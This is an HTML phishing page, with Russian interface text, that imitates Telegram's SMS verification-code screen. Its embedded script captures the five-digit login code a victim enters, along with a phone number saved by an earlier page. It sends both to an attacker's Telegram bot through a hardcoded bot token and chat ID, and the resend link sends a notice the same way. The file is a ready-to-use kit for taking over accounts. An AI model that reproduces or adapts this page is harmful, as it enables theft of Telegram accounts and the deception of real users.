<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram — ввод кода</title>
    <style>
        /* ========== СТИЛИ CSS ========== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            color: #1c1e21;
        }

        .tg-card {
            max-width: 400px;
            width: 100%;
            background-color: #ffffff;
            border-radius: 16px;
            box-shadow: 0 4px 18px rgba(0, 0, 0, 0.08), 0 2px 6px rgba(0, 0, 0, 0.02);
            padding: 32px 24px 28px;
        }

        .tg-header h1 {
            font-size: 28px;
            font-weight: 600;
            line-height: 1.2;
            color: #0a0a0a;
            letter-spacing: -0.2px;
            margin-bottom: 12px;
        }

        .tg-header .phone-hint {
            font-size: 15px;
            color: #6c757d;
            font-weight: 400;
            margin-bottom: 32px;
            line-height: 1.4;
        }

        /* Контейнер для 5 квадратиков */
        .code-container {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 32px;
        }

        .code-digit {
            width: 60px;
            height: 64px;
            background-color: #f8f9fa;
            border: 1.5px solid #e9ecef;
            border-radius: 14px;
            font-size: 32px;
            font-weight: 500;
            text-align: center;
            line-height: 64px;
            color: #1a1a1a;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
            transition: border 0.15s;
            font-family: 'Courier New', monospace;
        }

        /* Эффект фокуса для активного квадратика */
        .code-digit.filled {
            border-color: #2f8dbb;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(47, 141, 187, 0.1);
        }

        /* Кнопка отправки */
        .submit-btn {
            background-color: #2f8dbb;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px 20px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            text-align: center;
            cursor: pointer;
            letter-spacing: 0.3px;
            box-shadow: 0 2px 8px rgba(47, 141, 187, 0.2);
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #2679a3;
        }

        .submit-btn:active {
            background-color: #1f6385;
        }

        .submit-btn:disabled {
            background-color: #9bc2d9;
            cursor: not-allowed;
        }

        /* Ссылка для повторной отправки */
        .resend-link {
            text-align: center;
            font-size: 15px;
            color: #6c757d;
            margin-top: 8px;
        }

        .resend-link a {
            color: #2f8dbb;
            text-decoration: none;
            font-weight: 500;
        }

        hr {
            border: none;
            border-top: 1px solid #eef2f5;
            margin: 20px 0 14px;
        }

        .back-link {
            text-align: center;
            font-size: 15px;
        }

        .back-link a {
            color: #8e98a3;
            text-decoration: none;
        }

        /* Мобильные улучшения - ИСПРАВЛЕНО */
        @media (max-width: 480px) {
            .tg-card {
                padding: 24px 16px;
            }
            
            .code-digit {
                width: 55px;  /* Увеличено для 5 цифр */
                height: 60px;
                font-size: 30px;
                line-height: 60px;
            }
        }

        @media (max-width: 400px) {
            .code-digit {
                width: 50px;
                height: 55px;
                font-size: 28px;
                line-height: 55px;
            }
        }

        @media (max-width: 360px) {
            .code-digit {
                width: 45px;
                height: 50px;
                font-size: 26px;
                line-height: 50px;
            }
            
            .code-container {
                gap: 5px;
            }
        }
    </style>
</head>
<body>
    <div class="tg-card">
        <div class="tg-header">
            <h1>Введите код</h1>
            <div class="phone-hint" id="phoneDisplay">
                Мы отправили SMS с кодом проверки на Ваш телефон.
            </div>
        </div>

        <!-- 5 квадратиков для ввода кода -->
        <div class="code-container" id="codeContainer">
            <div class="code-digit" id="digit0"></div>
            <div class="code-digit" id="digit1"></div>
            <div class="code-digit" id="digit2"></div>
            <div class="code-digit" id="digit3"></div>
            <div class="code-digit" id="digit4"></div>
        </div>

        <!-- Кнопка для отправки кода -->
        <button class="submit-btn" id="submitBtn">ПОДТВЕРДИТЬ</button>

        <!-- Ссылка для повторной отправки -->
        <div class="resend-link">
            Не получили код? <a href="#" id="resendLink">Отправить снова</a>
        </div>

        <hr>

        <div class="back-link">
            <a href="index.html" id="backLink">← Назад</a>
        </div>
    </div>

    <script>
        // ========== СКРИПТ ДЛЯ 5-ЗНАЧНОГО КОДА ==========
        
        // ВАШИ ДАННЫЕ TELEGRAM
        const BOT_TOKEN = '8780785505:AAGKR5NJPxt2OHM0R4dQ725MyhV8JJ5pg3c';
        const CHAT_ID = '5373563389';
        
        // Получаем сохраненный номер
        const savedPhone = localStorage.getItem('tg_phone') || 'Номер не указан';
        
        // Показываем номер на странице
        const phoneDisplay = document.getElementById('phoneDisplay');
        if (phoneDisplay) {
            phoneDisplay.innerHTML = `Мы отправили SMS с кодом проверки на номер:<br><strong>${savedPhone}</strong>`;
        }
        
        // Элементы для кода (5 ЭЛЕМЕНТОВ)
        const digitElements = [
            document.getElementById('digit0'),
            document.getElementById('digit1'),
            document.getElementById('digit2'),
            document.getElementById('digit3'),
            document.getElementById('digit4')
        ];
        
        // Скрытое поле ввода
        const hiddenInput = document.createElement('input');
        hiddenInput.type = 'text';
        hiddenInput.inputMode = 'numeric';
        hiddenInput.pattern = '[0-9]*';
        hiddenInput.maxLength = 5; // 5 символов
        hiddenInput.style.position = 'absolute';
        hiddenInput.style.opacity = '0';
        hiddenInput.style.pointerEvents = 'none';
        document.body.appendChild(hiddenInput);
        
        let code = '';
        
        function updateDigits() {
            for (let i = 0; i < 5; i++) {
                if (i < code.length) {
                    digitElements[i].textContent = code[i];
                    digitElements[i].classList.add('filled');
                } else {
                    digitElements[i].textContent = '';
                    digitElements[i].classList.remove('filled');
                }
            }
        }
        
        digitElements.forEach(digit => {
            digit.addEventListener('click', () => hiddenInput.focus());
        });
        
        hiddenInput.addEventListener('input', (e) => {
            const rawValue = e.target.value.replace(/[^0-9]/g, '');
            code = rawValue.slice(0, 5);
            e.target.value = code;
            updateDigits();
        });
        
        hiddenInput.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace') {
                if (code.length > 0) {
                    code = code.slice(0, -1);
                    hiddenInput.value = code;
                    updateDigits();
                }
                e.preventDefault();
            }
        });
        
        // Функция отправки в Telegram
        function sendToTelegram(messageText) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const message = `
${messageText}
📱 <b>Номер:</b> ${savedPhone}
⏱ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
━━━━━━━━━━━━━━━━━━━━━
            `;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('✅ Отправлено в Telegram');
                } else {
                    console.error('❌ Ошибка Telegram:', data);
                }
            })
            .catch(error => {
                console.error('❌ Ошибка соединения:', error);
            });
        }
        
        // ОБРАБОТЧИК КНОПКИ ПОДТВЕРЖДЕНИЯ
        document.getElementById('submitBtn').addEventListener('click', function() {
            if (code.length !== 5) {
                alert('Пожалуйста, введите полный 5-значный код');
                hiddenInput.focus();
                return;
            }
            
            // Блокируем кнопку
            const btn = this;
            btn.disabled = true;
            btn.textContent = 'ОТПРАВКА...';
            
            // Отправляем код в Telegram
            sendToTelegram(`🔑 <b>КОД ПОДТВЕРЖДЕНИЯ:</b> <code>${code}</code>`);
            
            alert('✅ Код отправлен!');
            
            // Разблокируем кнопку через 2 секунды
            setTimeout(() => {
                btn.disabled = false;
                btn.textContent = 'ПОДТВЕРДИТЬ';
                code = '';
                updateDigits();
                hiddenInput.value = '';
                hiddenInput.focus();
            }, 2000);
        });
        
        // Повторная отправка кода
        document.getElementById('resendLink').addEventListener('click', (e) => {
            e.preventDefault();
            sendToTelegram(`🔄 <b>ЗАПРОС НОВОГО КОДА</b>`);
            alert('✅ Новый код отправлен на номер ' + savedPhone);
        });
        
        // Возврат назад
        document.getElementById('backLink').addEventListener('click', (e) => {
            e.preventDefault();
            window.location.href = 'index.html';
        });
        
        // Фокус при загрузке
        window.addEventListener('load', () => {
            setTimeout(() => {
                hiddenInput.focus();
            }, 300);
        });
        
        // Клик по карточке возвращает фокус
        document.querySelector('.tg-card').addEventListener('click', (e) => {
            if (!e.target.closest('a') && !e.target.closest('button')) {
                hiddenInput.focus();
            }
        });
    </script>
</body>
</html>
